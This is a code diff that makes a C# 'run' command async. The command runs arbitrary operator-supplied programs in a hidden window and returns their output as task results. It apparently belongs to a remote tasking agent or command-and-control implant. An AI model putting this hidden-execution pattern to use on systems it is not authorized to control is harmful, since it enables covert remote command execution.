@@ -1,4 +1,5 @@
 ﻿using Engineer.Commands;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -14,39 +15,47 @@ namespace Engineer.Commands
     {
         public override string Name => "run";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
-            task.Arguments.TryGetValue("/command", out string command);
-            task.Arguments.TryGetValue("/args", out string argument);
-
-            var output = new StringBuilder();
-
-            var process = new Process
+            try
             {
-                StartInfo = new ProcessStartInfo
+
+                task.Arguments.TryGetValue("/command", out string command);
+                task.Arguments.TryGetValue("/args", out string argument);
+
+                var output = new StringBuilder();
+
+                var process = new Process
                 {
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    WorkingDirectory = Directory.GetCurrentDirectory(),
-                    FileName = command,
-                    Arguments = argument,
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true
-                }
-            };
+                    StartInfo = new ProcessStartInfo
+                    {
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        WorkingDirectory = Directory.GetCurrentDirectory(),
+                        FileName = command,
+                        Arguments = argument,
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true
+                    }
+                };
 
-            process.OutputDataReceived += (_, args) => { output.AppendLine(args.Data); };
-            process.ErrorDataReceived += (_, args) => { output.AppendLine(args.Data); };
+                process.OutputDataReceived += (_, args) => { output.AppendLine(args.Data); };
+                process.ErrorDataReceived += (_, args) => { output.AppendLine(args.Data); };
 
-            process.Start();
-            process.BeginOutputReadLine();
-            process.BeginErrorReadLine();
-            process.WaitForExit();
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+                process.WaitForExit();
 
-            process.Dispose();
+                process.Dispose();
 
-            return output.ToString();
+                Tasking.FillTaskResults(output.ToString(), task, EngTaskStatus.Complete);
+            }
+            catch (Exception ex)
+            {
+                Tasking.FillTaskResults(ex.Message, task, EngTaskStatus.Failed);
+            }
         }
     }
 }
